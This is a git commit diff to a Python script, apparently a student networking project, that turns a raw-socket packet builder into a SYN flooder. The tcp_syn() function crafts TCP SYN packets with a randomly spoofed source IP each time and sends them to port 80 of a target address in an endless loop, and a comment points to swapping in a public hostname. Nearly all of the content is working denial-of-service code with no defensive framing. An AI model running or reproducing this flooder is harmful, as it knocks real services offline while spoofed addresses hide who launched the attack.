ef2b2cc44f8c4e8766c9e766138a3994beb20983
ShanjinurIslam <spondoncsebuet@gmail.com>
2019-09-07 11:53:52 +0600

    final flooding code

--- main.py
+++ main.py
@@ -15,84 +15,85 @@ def tcp_checksum(msg):
 	s = ~s & 0xffff
 	
 	return s
-
-#create a raw socket
-try:
-	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-except:
-	sys.exit()
-
-# tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
-# s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+def tcp_syn():
 	
-# now start constructing the packet
-packet = '';
+	#create a raw socket
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+	except:
+		sys.exit()
 
-source_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
-dest_ip = "172.20.10.2"	# or socket.gethostbyname('www.google.com')
+	# tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
+	# s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+	
+	# now start constructing the packet
+	packet = '';
 
-# ip header fields
-ip_ihl = 5
-ip_ver = 4
-ip_tos = 0
-ip_tot_len = 0	# kernel will fill the correct total length
-ip_id = 54321	#Id of this packet
-ip_frag_off = 0
-ip_ttl = 255
-ip_proto = socket.IPPROTO_TCP
-ip_check = 0	# kernel will fill the correct checksum
-ip_saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
-ip_daddr = socket.inet_aton ( dest_ip )
+	source_ip = ".".join(map(str,(random.randint(0,255) for _ in range(4))))
+	dest_ip = "172.20.10.2"	# or socket.gethostbyname('www.google.com')
 
-ip_ihl_ver = (ip_ver << 4) + ip_ihl
+	# ip header fields
+	ip_ihl = 5
+	ip_ver = 4
+	ip_tos = 0
+	ip_tot_len = 0	# kernel will fill the correct total length
+	ip_id = 54321	#Id of this packet
+	ip_frag_off = 0
+	ip_ttl = 255
+	ip_proto = socket.IPPROTO_TCP
+	ip_check = 0	# kernel will fill the correct checksum
+	ip_saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
+	ip_daddr = socket.inet_aton ( dest_ip )
 
-# the ! in the pack format string means network order
-ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+	ip_ihl_ver = (ip_ver << 4) + ip_ihl
 
-# tcp header fields
-tcp_source = 1234	# source port
-tcp_dest = 80	# destination port
-tcp_seq = 454
-tcp_ack_seq = 0
-tcp_doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
-#tcp flags
-tcp_fin = 0
-tcp_syn = 1
-tcp_rst = 0
-tcp_psh = 0
-tcp_ack = 0
-tcp_urg = 0
-tcp_window = socket.htons (5840)	#	maximum allowed window size
-tcp_check = 0
-tcp_urg_ptr = 0
+	# the ! in the pack format string means network order
+	ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
 
-tcp_offset_res = (tcp_doff << 4) + 0
-tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
+	# tcp header fields
+	tcp_source = 1234	# source port
+	tcp_dest = 80	# destination port
+	tcp_seq = 454
+	tcp_ack_seq = 0
+	tcp_doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
+	#tcp flags
+	tcp_fin = 0
+	tcp_syn = 1
+	tcp_rst = 0
+	tcp_psh = 0
+	tcp_ack = 0
+	tcp_urg = 0
+	tcp_window = socket.htons (5840)	#	maximum allowed window size
+	tcp_check = 0
+	tcp_urg_ptr = 0
 
-# the ! in the pack format string means network order
-tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
+	tcp_offset_res = (tcp_doff << 4) + 0
+	tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
 
-user_data = 'SYNFLOOD'
+	# the ! in the pack format string means network order
+	tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
 
-# pseudo header fields
-source_address = socket.inet_aton( source_ip )
-dest_address = socket.inet_aton(dest_ip)
-placeholder = 0
-protocol = socket.IPPROTO_TCP
-tcp_length = len(tcp_header) + len(user_data)
+	user_data = 'SYNFLOOD'
 
-psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
-psh = psh + tcp_header + user_data;
+	# pseudo header fields
+	source_address = socket.inet_aton( source_ip )
+	dest_address = socket.inet_aton(dest_ip)
+	placeholder = 0
+	protocol = socket.IPPROTO_TCP
+	tcp_length = len(tcp_header) + len(user_data)
 
-tcp_check = tcp_checksum(psh)
+	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
+	psh = psh + tcp_header + user_data;
 
-# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
-tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
+	tcp_check = tcp_checksum(psh)
 
-# final full packet - syn packets dont have any data
-packet = ip_header + tcp_header + user_data
+	# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
+	tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
 
+	# final full packet - syn packets dont have any data
+	packet = ip_header + tcp_header + user_data
+	s.sendto(packet, (dest_ip , 0 ))
 
 if __name__ == "__main__":
 	while(True):
-		s.sendto(packet, (dest_ip , 0 ))
+		tcp_syn()
